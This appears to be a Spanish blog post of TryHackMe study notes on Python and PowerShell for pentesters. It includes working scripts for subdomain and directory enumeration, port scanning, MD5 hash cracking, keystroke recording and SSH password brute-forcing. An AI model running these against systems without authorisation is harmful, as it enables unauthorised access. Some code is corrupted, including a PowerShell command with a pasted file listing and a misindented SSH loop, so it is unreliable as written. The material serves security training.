---
layout: post
title: 0.Scripting for pentesters.
subtitle: Compilation of notes of Tryhackme's scripting rooms.
tags: [thm]
---

## 0. Índice.

- 1 Python Basics.
- 2 Python for Pentesters.
- 3 Hacking with Powershell.
- 4 Powershell for Pentesters.

<br />

### 1. Python Basics.

**Introduction to Python**

En este apartado nos introduciremos al lenguaje de programación Python.

Cubriremos:

- Variables
- Loops
- Functions
- Data Structures
- If statements
- Files

Antes de comenzar diremos que Python es un lenguaje de programación interpretado orientado a la construcción de scripts (pequeños fragmentos de código). Cuando hablamos de que es un *lenguaje interpretado* nos referimos a que los scripts de python se ejecutan con la ayuda del intérprete de python.

Por otro lado, C por ejemplo, es un *lenguaje compilado*. De un código escrito en C es necesario extraer un ejecutable (proceso que se llama compilación) mediante el compilador de C, este ejecutable después se cargará en memoria dándo lugar al efectivo procesamiento del código por orden del usuario.

La diferencia entre un intérprete y un compilador es que un *intérprete* "interpreta" un programa para el procesador, esto es; transforma una sentencia del código a lenguaje máquina y seguidamente se la pasa al procesador para la ejecutación de dicha sentencia mientras que un *compilador* pasa todo el código a lenguaje a máquina generando un binario ejecutable que no se ejecuta sin previa orden del usuario (que es el que efectivamente ejecuta dicho binario).

Esto significa que para ejecutar un script de python necesitamos previamente un intérprete de python compatible. Podemos descargar dicho IDE desde [aquí](https://www.python.org/downloads/)

<br />

**Hello World**

Para comenzar, vamos a crear un programa que despliega algo de texto por pantalla:

```python
# This is an example comment
print("Hello World")
```

Esto mostrará por pantalla el término "Hello World".

De aquí podemos extraer fundamentalmente dos cosas:

- La primera es que podemos utilizar el statement de *print()* para mostrar por pantalla un string entrecomillado.
- La segunda es que cualquier cosa que vaya después de un '#' es ignorado por el intérprete.

<br />

**Mathematical Operators**

Python puede efectuar operaciones matemáticas mediante el uso de los siguientes términos, enter las más básicas encontramos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903182139.png' | relative_url }}" text-align="center"/>
</div>

Pero tambíen tenemos operadores más avanzados como comparadores, fundamentales en bucles (if, while, etc):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903182323.png' | relative_url }}" text-align="center"/>
</div>

Por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903182407.png' | relative_url }}" text-align="center"/>
</div>

Observemos que hemos retirado las comillas.

<br />

**Variables and Data Types. Tiped languages.**

Las variables son contenedores de datos con nombre. En Python funcionan asignando un valor a un nombre con el operador asigandor '*=*'. Por ejemplo:

```python
food = "ice cream"
money = 2000
```

El valor de las variables pueden cambiarse a lo largo del código:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903183848.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, y una vez asentada la idea de que una variable es un contenedor de datos pasemos a hablar de qué es un dato.

Un dato es una unidad de información y estos, como la última, pueden ser de diferentes tipos. En lo referente a los datos encontramos dos tipos de lenguajes: los lenguajes tipados; aquellos que distinguen entre tipos de datos y reflejan esta discriminación en las variables y los no tipados; aquellos que no discriminan.

Centrándonos en lo que nos concierne, *Python es un lenguaje dinámica y débilmente tipado*, esto es; que por un lado distingue entre tipos de datos aunque no nos obligue a declarar tipos de variables (débil) y por otro, el tipo de variable está asociado al valor de dicha variable (dinámico).

De forma que al mismo nombre le podemos asociar distintos tipos de valores a lo largo del código sin mayores complicaciones:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903185555.png' | relative_url }}" text-align="center"/>
</div>

<br />

El valor de las variables se sacan por pantalla pasándo el nombre como argumento a la función print():

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903190147.png' | relative_url }}" text-align="center"/>
</div>

<br />

**If. Logical and Boolean Operators.**

Un programa es un conjunto de líneas de código, sin embargo, esta estructura procedural no impide que un programa pueda tener divergencias de acción.

El *if* statement ayuda al usuario a que un programa tome decisiones en función de una condición booleana:

```python
if age < 17:
	print('You are NOT old enough to drive')
else:
	print('You are old enough to drive')
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903202253.png' | relative_url }}" text-align="center"/>
</div>

<br />

- El término *if* indica el comienzo de la instrucción, seguida de un conjunto de condiciones.
- La declaración if solo se ejecuta si la condición (o conjunto de condiciones) es verdadera. En nuestro ejemplo, es *age < 17*; si esa condición es verdadera (la edad es mayor de 17), se ejecuta el código dentro de la instrucción if. Según el ejemplo, si no se cumplen ciertas condiciones, el programa puede ejecutar de forma predeterminada el código que se muestra en la *else* parte de la instrucción if. 
- Los dos puntos *:* marcan el final de la instrucción if.
- Tenga en cuenta la sangría (ajuste de línea). Cualquier cosa después de los dos puntos que tenga sangría, se considera parte de la instrucción if, que ejecutará el programa.

Algunas expresiones booleanos y lógicos que nos pueden ayudar en la construcción de if son los siguientes:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903230113.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220903230126.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Loops**

Mientas que el *if* nos permite hacer que un programa tome un camino u otro en función del contexto. Ahora, los bucles 2022-07-10-0.Scripting_for_pentesters.md o *while* nos permiten introducir al programa en un número de iteraciones limitadas o hasta que se cumpla una condición respectivamente.

- *for*: El for concretamente nos permite tomar una lista de valores y actuar con ellos en una iteración de código para cada valor:

```python
websites = ["facebook.com", "google.com", "amazon.com"]
for site in websites:
	print(site)
```

Así, este fragmento de código en primer lugar recoge una lista de nombres en una tupla 'websites' y seguidamente inicia la estructura del bucle for:

El término *for site in websites* inicia el for statement, seguidamente viene el término *site* que es el nombre de la variable que almacenará cada una de los valores de la lista en cada iteración tal y como indica el resto de la sentencia 'in website'.

Seguidamente, viene el resto del statement que consiste en el código que se repite en cada iteración, el número de iteraciones obviamente coincide con el número de elementos que componen la lista.

Una forma más simple del código anterior sería:

```python
for i in range(5):
	print(i)
```

<br />

- *while*: Por otro lado, el bucle while mantiene las iteraciones hasta que cierta condición se deja de cumplir.

```python
i = 1
while i <= 10:
	print(i)
	i = i + 1
```

El mecanismo del código es claro, mientras i valga menos de 10, el código se repetirá en sucesivas iteraciones.

<br />

**Introduction to Functions**

En la medida en la que un programa o script crece, también crece la complejidad del mismo y su consecuente tendencia a la no correcta legibilidad y la repetición.

Para paliar este efecto tenemos las *funciones*, que actuan como contenderos de código en el mismo sentido en el que las variables actúan como contenedores de datos aunque con algunas diferencias.

Por ejemplo, tenemos el siguiente código que define una función y la utiliza:

```python
def sayHello(name):
	print("Hello " + name + "! Nice to meet you.")

sayHello("ben") # Output is: Hello Ben! Nice to meet you
```

En primer lugar utiliza el término *def* para indicar la definición de una función al que sigue el nombre de la misma y los parámetros que necesita, en este caso uno: 'name'. La cabecera de la función finaliza con dos puntos; ':'.

Seguidamente, todo el código que aparece debajo de forma identada es el código del que se compone la función, notemos que la variable name se utiliza dentro de la misma.

Asociado al concepto de función tenemos el concepto del alcance de una variable, la variable 'name' en la función anterior sólo tiene alcance dentro de la función, fuera de ella no está reconocida como una variable definida a ojos del intérprete tal y como vemos en la siguiente imagen:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220904160426.png' | relative_url }}" text-align="center"/>
</div>

No ocurre así, al revés:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220904160700.png' | relative_url }}" text-align="center"/>
</div>

Se dice que las variables definidas dentro de una función tienen un alcance "local" mientras que la variable definida en el exterior de la misma y de cualquier otra función tiene alcance "global".

<br />

**Files**

Una de las razones por las que Python es un lenguaje de programación tan importante es porque puede interactuar con el sistema operativo accediendo a ficheros o instruyendo 'OS Commands' tal y como Bash lo haría en Linux o Powershell en Windows con la diferencia de que ambos están limitados a dichos sistemas operativos.

De esta forma, Python es un lenguaje de programación que tiene la capacidad de operar tanto con Linux como con Windows y por "addirittura" casi siempre podemos encontrar un intérprete de Python en la máquina que estamos asaltando revelándose así como un lenguaje de programación imprescindible.

Veámos como podemos acceder a los ficheros con Python. Debemos saber antes que anda que para acceder a un fichero utilizamos la función interna (built-in function) *open* que tiene incorporados parámetros para interactuar de diferentes formas con los ficheros:

```python
varname = open("file_name", "parameter")
```

El resultado de estas interacciones se guardan en variables que luego se manipulan dentro del código.

- *Lectura de ficheros*:

Para leer un fichero empleamos el parámetro "r" de la función *"open"* anteriormente mencionada. Seguidamente, utilizamos un método sobre esta variable para acceder al contenido:

```python
print(f.read())
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220904190320.png' | relative_url }}" text-align="center"/>
</div>

También podríamos utilizar el método "*readlines()*".

<br />

- *Escritura de ficheros*:

En lo relativo a la escritura de ficheros encontramos dos tipos de acción, creación o sobreescritura de un fichero con el parámetro *"w"*:

```python
f = open("demofile2.txt", "w") # Creating and writing to a new file
f.write("file content")
f.close()
```

O añadir al contenido de un fichero existente otro contenido con el parámetro "*a*" (append)

```python
f = open("demofile1.txt", "a") # Append to an existing file
f.write("The file will include more text..")
f.close()
```

<br />

**Importación de librerias**

En el apartado anterior hemos utilizado una función interna de Python, existen muchas otras funciones internas, útiles en función del propósito que no se encuentran dentro del marco principal de Pythion, si no que hay que importalas desde librerias externas. que no son más que una colección de archivos que contienen funciones.

Por ejemplo;

```python
import datetime
current_time = datetime.datetime.now()
print(current_time)
```

Hemos importado la libreria datetime con el término *import* y seguidamente nos hemos visto capacitados para utilizar la función interna "current_time".

Algunas bibliotecas importantes como pentester son:

- Request - simple HTTP library.
- [Scapy](https://scapy.readthedocs.io/en/latest/introduction.html) - send, sniff, dissect and forge network packets
- [Pwntools](https://docs.pwntools.com/en/stable/) - a CTF & exploit development library.

Muchas de estas bibliotecas ya están integradas en el lenguaje de programación; sin embargo, las bibliotecas escritas por otros programadores que aún no están instaladas en su máquina se pueden instalar usando una aplicación llamada pip, que es el administrador de paquetes de Python. Digamos que desea instalar la biblioteca "scapy" (que le permite crear sus propios paquetes en código y enviarlos a otras máquinas); lo instala primero ejecutando el comando *pip install scapy*, después de lo cual en su programa ahora puede importar la biblioteca scapy.

<br />

### 2. Python for Pentesters.

**Intro**

Anteriormente nos hemos adentrado en el uso básico de Python. Con este conocimiento supoerficial vamos a ver cómo podemos utilizar la herramienta Python como pentesters.

Un recurso importante es la herramienta *PyInstaller* instalable desde el gestor de paquetes de Python PIP:

```bash
pip install pyinstaller
```

Este que convierte scripts de python en ejecutables de Windows. Otra herramienta es *py2exe*.

<br />

**Subdomain Enumeration**

Una de las capacidades de Python consiste en la automatización de tareas. Esto lo podemos aplicar en la búsqueda de subdominios de interés.

Como ya sabemos este es un proceso que que se focaliza en el descubrimiento de nuevos dispositivos o secciones dentro de la organización con el objetivo de ampliar la superficie de ataque y encontrar más puntos vulnerables.

El siguiente código de Python busca subdominios:

```python
import requests
import sys

sub_list = open("subdomains.txt").read()
subdoms = sub_list.splitlines()

for sub in subdoms:
	sub_domains = f"http://{sub}.{sys.argv[1]}"

	try:
	requests.get(sub_domains)

	except requests.ConnectionError:
	pass

	else:
	print("Valid domain: ",sub_domains)
```

- En primer lugar importa las librerias necesarias.

```python
import requests
import sys
```
- Seguidamente, abre un fichero con candidatos a subdominios y divide el contenido por líneas.

```python
sub_list = open("subdomains.txt").read()
subdoms = sub_list.splitlines()
```

- Por último, implementa un bucle 2022-07-10-0.Scripting_for_pentesters.md con el que realiza para cada subdominio una request HTTP-GET y si esta tiene éxito se acepta como subdominio válido, de lo contrario se ignora y se pasa a la siguiente línea.

- Primero, forma la URL del subdominio:

```default
sub_domains = f"http://{sub}.{sys.argv[1]}"
```

Juntando los términos: "http:// + subdominio de la iteración (sub) + el primer parámetro con el que se ha lanzado el script desde la línea de comandos (sys.argv\[1])" que será en principio el dominio de la web que se está explorando.

```bash
python3 enumsubdomain.py tryhackme.com #<-- sys.argv[1]
```

- Seguidamente intenta una conexión, HTTP-GET utilizando el string construido antes.

```python
try:
requests.get(sub_domains)
```

- Si no tiene éxito se crea una excepción en la que se pasa a la siguiente línea, de lo contrario se acepta como un dominio válido:

```python
except requests.ConnectionError:
	pass
else:
	print("Valid domain: ",sub_domains)
```

<br />

**Directory Enumeration**

El siguiente código escrito en python define una herramienta de enumeración de directorios simple:

```python
import requests
import sys

sub_list = open(sys.argv[2], encoding='latin-1').read()
directories = sub_list.splitlines()

for dir in directories:
	dir_enum = f"http://{sys.argv[1]}/{dir}.html"
	r = requests.get(dir_enum)
	if r.status_code==404:
		pass
	else:
		print("Valid directory:" ,dir_enum)
```

- En primer lugar, importa las librerías necesarias.

```python
import requests
import sys
```

- Seguidamente, abre el documento que contiene candidatos a directorios y lo divide en líneas:

```python
sub_list = open("wordlist.txt").read()
directories = sub_list.splitlines()
```

- Por último, implementa un bucle for en el que emplea cada línea del documento anterior para realizar una request HTTP-GET sobre el directorio de la dirección ofrecida como parámetro a la hora de invocar el script con el intérprete de python. Se recoge la respuesta y si devuelve un código que no sea el 404 se acepta como válido de lo contrario se rechaza y se pasa al siguiente.

- Se construye la URL con el directorio en cuestión:

```python
dir_enum = f"http://{sys.argv[1]}/{dir}.html"
```

Esta URL se crea juntando los términos "http://" +"direcciónwebpasadacomoparámetro(sys.argv\[1])"+"directorio(dir).html"

- Se realiza la request y se evalúa con un if:

```python
r = requests.get(dir_enum)
	if r.status_code==404:
		pass
	else:
		print("Valid directory:" ,dir_enum)
```

Al igual que el del apartado anterior, este script se debe lanzar con un parámetro que es de hecho la propia dirección del servidor que se desea explorar:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220907164839.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Network Scanner**

También podemos utilizar Python para montar un scaner ICMP simple para identificar grandes redes de dispositivos. Por otra parte es una herramienta muy simple debido a que los paquetes ICMP envíados por el código pueden ser fácilmente monitoreados o directamente bloqueados.

```python
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range)

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
	print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

Los resultados serían similares a:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220907182936.png' | relative_url }}" text-align="center"/>
</div>

Antes de utilizar el script sería necesario instalarse scapy antes:

```bash
apt install python3-scapy
```

<br />

**Port Scanner**

También podemos construir un Scanner de puertos básicos:

```python
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6'
open_ports =[]

ports = range(1, 65535)


def probe_port(ip, port, result = 1):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(0.5)
		r = sock.connect_ex((ip, port))
		if r == 0:
			result = r
		sock.close()
	except Exception as e:
		pass
	return result


for port in ports:
	sys.stdout.flush()
	response = probe_port(ip, port)
	if response == 0:
		open_ports.append(port)


if open_ports:
	print ("Open Ports are: ")
	print (sorted(open_ports))
else:
	print ("Looks like no ports are open :(")
```

Es posible que necesitemos tener instalado el paquete pyfiglet:

```bash
apt install python3-pyfiglet
```

<br />

**File Downloader**

Herramientas de Linux como Wget o Certutil en Windows son útiles para descargar ficheros.

Python puede ser utilizado con el mismo propósito con, por ejemplo, el siguiente código:

```python
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)
```

- Primero se cargan las librerias necesarias.
- Se guarda en la variable URL la propia URL hacia el fichero que queremos descargar.
- Seguidamente, se guarda en una variable una request HTTP-GET a la URL antes construida.
- Por último, se escribe el contenida de la respuesta almacenada en la variable anterior en un nuevo fichero que, por comodidad, tiene el mismo nombre que el fichero que queremos descargar.

Este código se puede modificar para descargar otra clase de ficheros:

```python
url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)
```

<br />

**Hashcraker**

Como sabemos, un Hash es el producto de pasar un dato (como una contraseña) por una función de hash que en términos simples, transforma el dato de forma que el producto es único para el dato y no puede de ningún modo conducir a la recuperación de la información.

Los hashes sólo son reversibles por un ataque de diccionario, que consiste en, sabiendo el método de transformación de la información, transformar vía el mismo método una lista de términos esperando obtener una coincidencia con el hash original.

Podemos escribir en Python un script para automatizar un ataque de lista de diccionario:

```python
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r', encoding='latin-1') as file:
	for line in file.readlines():
		hash_ob = hashlib.md5(line.strip().encode())
		hashed_pass = hash_ob.hexdigest()
		if hashed_pass == hash_input:
			print('Found cleartext password! ' + line.strip())
			exit(0)
```

Podemos observar, saltándonos una descripción minuciosa del script, que lo que hace es pedir al usuario una lista de posibles candidatos, el hash a crackear e implementa un bucle en el que lee línea a línea cada uno de los candidatos y los transforma de acuerdo al formato escogido

```python
hash_ob = hashlib.md5(line.strip().encode())
```

que en este caso es md5 (MD5 hash value) pero que puede ser uno de los muchos que python soporta gracias a la librería hashlib

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220907210816.png' | relative_url }}" text-align="center"/>
</div>

y luego compara ambas cadenas de caracteres. Así, si hay un match, muestra el candidato por pantalla.

<br />

**Keylogger**

Un keylogger es un tipo de malware que registra todas las teclas del ordenador que el usuario pulsa. Eficaz para recopilar información sensible, como contraseñas, correos, etc.

Podemos construir un script con Python para fabricar un keylogger gracias al modulo 'keyboard' instalable desde pip3:

```bash
pip3 install keyboard
```

El código es:

```python
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```

<br />

**SSH Bruteforcing**

Podemos llevar a cabo un ataque de fuerza bruta para autenticarnos en un servicio. En este caso por ejemplo en SSH:

```python
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(target, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code = 1
	ssh.close()
	return code

with open(password_file, 'r', encoding='latin-1') as file:
	for line in file.readlines():
		password = line.strip()

	try:
		response = ssh_connect(password)

		if response == 0:
			print('password found: '+ password)
			exit(0)
		elif response == 1:
			print('no luck')
	except Exception as e:
		print(e)
	pass

input_file.close()
```

Como en cualquier ataque de fuerza bruta, se le pasa una dirección de un servidor, un username, una lista de candidatos y lleva a cabo, mediante un bucle for, una serie de intentos de logeos en baterias. Si hay un match se expone la contraseña y de lo contrario se ignora el candidato.

<br />

### 3. Hacking with PowerShell.

**Intro**

En esta sección aprenderemos PowerShell y orientaremos la adquisición de conocimiento a aquello que nos interese saber como pentesters.

<br />

**What is Powershell?**

PowerShell es el Windows Scripting Language y entorno de shell que está construido sobre el marco .NET.

Esto también permite que Powershell ejecute funciones .NET directamente desde su shell. La mayoría de los comandos de Powershell, llamados *cmdlets* están escritos en .NET. A diferencia de otros lenguajes de secuencias de comandos y entornos de shell, la salida de estos *cmdlets*  son objetos, lo que hace que Powershell esté algo orientado a objetos (como Java). Esto también significa que la ejecución de cmdlets le permite realizar acciones en el objeto de salida (lo que facilita pasar la salida de un *cmdlet*  a otro). 

El nombre de un cmdlet corriente se representa mediante *Verb-Noun*; por ejemplo, el cmdlet  para listar comandos se llama Get-Command, para obtener ayuda de un comando, Get-Help \<comand>.

<br />

**Basic Powershell Commands**

Veámos, ahora que sabemos cómo funciona Poweshell dentro de Windows, algunos comandos básicos de Powershell.

- *Get-Help*:

Ya sabemos del apartado anterior que Get-Help puede proporcionar ayuda sobre un *cmdlet*. Para obtener ayuda de un comando particular empleamos el siguiente comando:

```powershell
Get-Help <Command>
```

Además, podemos tener ejmplos concretos de uso mediante el modificador *-examples*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912101305.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Get-Command*: Este comando lista todos los comandos disponibles que se ajusten a una serie de criterios (pattern matching), por ejemplo Get-Command \<Verb>-\* (Get-Command New-\*) o Get-Command \*-\<Noun>.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912102246.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Object Manipulation*: Como ya comentábamos en la sección anterior, el output de un cmdlet es un objeto y como tal, PowerShell tiene funciones y herramientas que nos permiten manipular el output de un cmdlet con distintos propósitos (como mostrar la información por pantalla de forma distinta, pasar el output directamente a otro cmdlet como input, etc).

La herramienta fundamental es el *pipeline* (|), que nos permite pasar el output de un cmdlet como input sobre otro cmdlet tal y como ocurre en Linux, la principal diferencia es que en lugar de pasar texto como tal, lo que pasa es un objeto y esto puede conllevar algunas diferencias.

Por ejemplo, sabemos que un objeto es una istancia de una clase que suele tener asociado atributos y métodos (funciones específicas del objeto), para ver estos detalles podemos utilizar el cmdlet *Get-Member*:

```powershell
Get-Command | Get-Member -MemberType Method
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912103853.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Creación de objetos*:

Podemos emplear el término Select-Object para extraer propiedades de otros objetos y adherirlos a un objeto nuevo.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912110615.png' | relative_url }}" text-align="center"/>
</div>

Modificadores para extraer información particular.

- first - obtiene el primer objeto x
- last - obtiene el último objeto x
- único - muestra los objetos únicos
- skip - salta x objetos

<br />

- *Filtrado de Objetos*: Para poder organizar el output de un comando en base a patrones tenemos el cmdlet *Where-Object*. El uso sería de la siguiente forma:

```powershell
Verb-Noun | Where-Object -Property PropertyName -operator Value

Verb-Noun | Where-Object {$_.PropertyName -operator Value}
```

Donde *-operator* se encuentra una lista de los siguientes operadores:

- *-Contains*: si algún elemento del valor de la propiedad coincide exactamente con el valor especificado
- *-EQ*: si el valor de la propiedad es el mismo que el valor especificado
- *-GT*: si el valor de la propiedad es mayor que el valor especificado

Por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912131622.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Ordenamiento de Objetos*:

Podemos emplear el término *Sort-Object* para ordenar la información que emite un comando:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912132556.png' | relative_url }}" text-align="center"/>
</div>

<br />

Veámos ahora una serie de ejemplos prácticos:

- *Búsqueda de ficheros*:

```powershell
Get-ChildItem -Recurse interesting-file* -ErrorAction SilentlyContinue
```

El comando anterior utiliza el comando *Get-ChildItem* para buscar un fichero, de forma recursiva que empiece por la cadena de caracteres "interesting-file" el asterisco simboliza que a esta cadena le puede seguir cualquier cosa y por último silencia errores:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912142603.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Lectura de contenidos de ficherlo*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912151211.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Medir contenido de un fichero (Líneas)*:

Emplearemos el siguiente comando:

```powershell
Get-Command > command.txt; Get-Content command.txt | Select-String Cmdlet | Measure-Object -Line
```

En él, en primer lugar utilizamos el comando Get-Command para listar todos los Cmdlets, alias, funciones instalados en el sistema y los envíamos sobre un fichero para que queden organizados por líneas. Seguidamente, sacamos el contenido de dicho fichero y seleccionamos aquellas que contengan el término Cmdlet al menos una vez con Select-String y con Measure-Object contamos dichas líneas.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912154617.png' | relative_url }}" text-align="center"/>
</div>

- *MD5 Hash*:

Para obtener el hash md5 de un fichero empleamos el siguiente comando:

```powershell
Get-FileHash -Algorithm md5 .\interesting-file.txt.txt
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912155232.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Para obtener el directorio actual*:

Get-Location.

<br />

- *HTTP-Request*:

Invoke-WebRequest

<br />

**Enumeration with Powershell**

Vamos a ver cómo podemos llevar a cabo una serie de enumeraciones dentro del dispositivo:

- *Usuarios*:

Para ver cuántos usuarios están dentro del dispositivo utilizamos el comando *Get-LocalUser*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912171128.png' | relative_url }}" text-align="center"/>
</div>

Para obtener información sobre las distintas cuentas podemos emplear el término *Select*, concretamente si quieremos saber a qué usuario pertenece por ejemplo un SID ( User Security Identifier) concreto utilizamos el siguiente comando:

```powershell
Get-LocalUser | Select 1.Scripting.md 2022-07-10-0.Scripting_for_pentesters.md 4.Windows.md 8-xVHv9MIY5l 8-xVHv9MIY5l.rar a.out apuntes etchashes.txt file.sh first_task_hashes firsttaskhashes.zip flag.txt GitBasics.md idrsa.id_rsa idrsa.txt Jig_Of_Sorts.mp3 Music Musica Musica2 ntlm.txt passwd.txt qv1ntv5.ovpn rar.txt regulation.bin.bak Resident Evil 5 soundtrack - Colors - Mercenaries Menu Screen-_9bFKKIHQxA.mp4.part scriptApuntes.sh secure.rar secure.zip shadow.txt THM Tools TunnelingScripts unshadow.txt zippy zip.txt ZZ Top - La Grange-Vppbdf-qtGU (online-audio-converter.com).mp3 | Select-String S-1-5-21-1394777289-3961777894-1791813945-501
```

Este lista los usuarios, obtiene sus especificacione y busca la línea correspondiente al patrón pasado como parámetro al cmdlet Select-String.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912171712.png' | relative_url }}" text-align="center"/>
</div>

O queremos saber cuántos usuarios no se les requiere contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912172015.png' | relative_url }}" text-align="center"/>
</div>

- *Grupos Locales*:

Para saber cuántos grupos locales hay en el sistema utilizamos el comando *Get-LocalGroup*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912172645.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Networking Basic Info*:

- *IP Info*: Empleamos el comando *Get-NetIPAddress*.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912172925.png' | relative_url }}" text-align="center"/>
</div>

- *Port listening*: Para obtener puertos escuchando en el sistema empleamos el comando:

```powershell
Get-NetTCPConnection -State Listen,Established
```

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912174105.png' | relative_url }}" text-align="center"/>
</div>

Si quisiéramos obtener información sobre una línea referente a un puerto concreto podemos pasar el output a un fichero para ordenar dicho output por líneas y de ahí extraer la línea que necesitamos filtrándo por puerto y luego borrando el fichero:

```powershell
Get-NetTCPConnection -State Listen > file.txt; Get-Content file.txt | Select-String 445; Remove-Item file.txt
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912174531.png' | relative_url }}" text-align="center"/>
</div>

- *Patches*: Para localizar parches o actualizaciones: Get-HotFix


<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912174915.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912175159.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Backup files*: Los backups están dentro de ficheros con extensión ".bak", así, lo que buscamos es un ficheor con dicha extensión:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912180239.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Process*: Para listar procesos empleamos *Get-Process*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912181804.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Tareas Programadas*: Para ver las tareas programadas empleamos *Get-ScheduledTask*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912182248.png' | relative_url }}" text-align="center"/>
</div>

Y para encontrar un parámetro concreto:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220912182456.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Basic Scripting**

Ahora que hemos ejecutado comandos de powershell, veámos cómo podemos ejecutar un script para poder realizar acciones más complejas. Los scripts de Powershell tienen la extensión *.ps1*. Para esto vamos a emplear el PowerShell ISE, el editor de textos de PowerShell.

Ahora, veámos un script de ejemplo, abrimos el script *listening-ports.ps1*:

```powershell
$system_ports = Get-NetTCPConnection -State Listen

$text_port = Get-Content -Path C:\Users\Administrator\Desktop\ports.txt

foreach($port in $text_port){

if($port -in $system_ports.LocalPort){
echo $port

```

Este script sencillo lleva a cabo, línea a línea, los siguientes pasos:

- Guarda en la variable *system_ports* el comando que lista todos los puertos que escuchen peticiones.
- Hace lo propio con la variable *text_port* en la que guarda el contenido del fichero port.txt del escritorio del administrador.
- Por último, implementa un bucle *foreach* en el que lee cada línea del fichero donde tiene listados los puertos y, si el puerto está escuchando entonces lo saca por pantalla.

<br />

### 4. PowerShell for Pentesters.

**Manipulating files**

- *Start-Process*: Con *start-process* podemos iniciar un proceso o lo que es lo mismo ejecutar un binario, como por ejemplo: notepad.exe:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913181646.png' | relative_url }}" text-align="center"/>
</div>

- *Get-Process*: Útil para listar todos los procesos que se están ejecutando. Podemos adjuntar el modificador *-Name* para filtrar por un nombre específico.

<div style="text-align:center">
